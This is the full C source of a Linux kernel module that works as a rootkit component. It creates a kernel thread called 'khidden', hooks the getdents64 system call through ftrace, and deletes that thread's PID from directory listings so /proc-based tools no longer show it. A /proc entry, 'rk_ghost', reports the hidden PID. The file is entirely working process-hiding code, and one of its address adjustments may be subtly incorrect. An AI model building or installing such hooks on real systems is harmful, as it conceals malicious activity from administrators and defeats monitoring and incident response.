// SPDX-License-Identifier: GPL-2.0
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/ftrace.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/uaccess.h>

#define ENDBR_SIZE 4

static struct proc_dir_entry *proc_entry;
static struct task_struct *ghost_thread;
static char ghost_pid_str[16];
static unsigned long sys_getdents64_addr;

typedef asmlinkage long (*sys_getdents64_t)(const struct pt_regs *);
static sys_getdents64_t orig_getdents64;

static unsigned long lookup_name(const char *name)
{
	struct kprobe kp = { .symbol_name = name };
	unsigned long addr;

	if (register_kprobe(&kp) < 0)
		return 0;
	addr = (unsigned long)kp.addr;
	unregister_kprobe(&kp);
	return addr;
}

static int ghost_loop(void *data)
{
	while (!kthread_should_stop())
		schedule_timeout_interruptible(HZ);
	return 0;
}

static long erase_pid(char *buf, long total)
{
	struct linux_dirent64 *cur;
	long off = 0;

	while (off < total) {
		cur = (struct linux_dirent64 *)(buf + off);

		if (strcmp(cur->d_name, ghost_pid_str) == 0) {
			long rest = total - off - cur->d_reclen;

			if (rest > 0)
				memmove(buf + off, buf + off + cur->d_reclen,
					rest);
			total -= cur->d_reclen;
			continue;
		}
		off += cur->d_reclen;
	}
	return total;
}

static asmlinkage long filtered_getdents64(const struct pt_regs *regs)
{
	long ret;
	char *buf;

	ret = orig_getdents64(regs);
	if (ret <= 0)
		return ret;

	buf = kvmalloc(ret, GFP_KERNEL);
	if (!buf)
		return ret;

	if (copy_from_user(buf, (void __user *)regs->si, ret)) {
		kvfree(buf);
		return ret;
	}

	ret = erase_pid(buf, ret);
	copy_to_user((void __user *)regs->si, buf, ret);

	kvfree(buf);
	return ret;
}

static void notrace redirect_getdents64(unsigned long ip, unsigned long parent_ip,
					struct ftrace_ops *ops,
					struct ftrace_regs *fregs)
{
	struct pt_regs *regs = ftrace_get_regs(fregs);

	if (!regs || within_module(parent_ip, THIS_MODULE))
		return;

	regs->ip = (unsigned long)filtered_getdents64;
}

static struct ftrace_ops pidfilter_ops = {
	.func  = redirect_getdents64,
	.flags = FTRACE_OPS_FL_SAVE_REGS
	       | FTRACE_OPS_FL_IPMODIFY
	       | FTRACE_OPS_FL_RECURSION,
};

static int install_hook(void)
{
	int err;

	sys_getdents64_addr = lookup_name("__x64_sys_getdents64");
	if (!sys_getdents64_addr)
		return -ENOENT;

	orig_getdents64 = (sys_getdents64_t)(sys_getdents64_addr - ENDBR_SIZE);

	err = ftrace_set_filter_ip(&pidfilter_ops, sys_getdents64_addr, 0, 0);
	if (err)
		return err;

	err = register_ftrace_function(&pidfilter_ops);
	if (err) {
		ftrace_set_filter_ip(&pidfilter_ops, sys_getdents64_addr, 1, 0);
		return err;
	}
	return 0;
}

static void remove_hook(void)
{
	unregister_ftrace_function(&pidfilter_ops);
	ftrace_set_filter_ip(&pidfilter_ops, sys_getdents64_addr, 1, 0);
}

static int spawn_ghost(void)
{
	ghost_thread = kthread_create(ghost_loop, NULL, "khidden");
	if (IS_ERR(ghost_thread))
		return PTR_ERR(ghost_thread);

	wake_up_process(ghost_thread);
	snprintf(ghost_pid_str, sizeof(ghost_pid_str), "%d",
		 ghost_thread->pid);
	return 0;
}

static ssize_t ghost_pid_show(struct file *file, char __user *buffer,
			      size_t count, loff_t *position)
{
	char buf[32];
	int len;

	len = snprintf(buf, sizeof(buf), "%d\n", ghost_thread->pid);
	return simple_read_from_buffer(buffer, count, position, buf, len);
}

static const struct proc_ops ghost_ops = {
	.proc_read = ghost_pid_show,
};

static int __init pidhider_init(void)
{
	int err;

	err = spawn_ghost();
	if (err)
		return err;

	err = install_hook();
	if (err) {
		kthread_stop(ghost_thread);
		return err;
	}

	proc_entry = proc_create("rk_ghost", 0444, NULL, &ghost_ops);
	if (!proc_entry) {
		remove_hook();
		kthread_stop(ghost_thread);
		return -ENOMEM;
	}

	pr_info("rk: process hiding active, PID %d hidden\n",
		ghost_thread->pid);
	return 0;
}

static void __exit pidhider_exit(void)
{
	proc_remove(proc_entry);
	remove_hook();
	kthread_stop(ghost_thread);
}

module_init(pidhider_init);
module_exit(pidhider_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Process visibility control via getdents64");
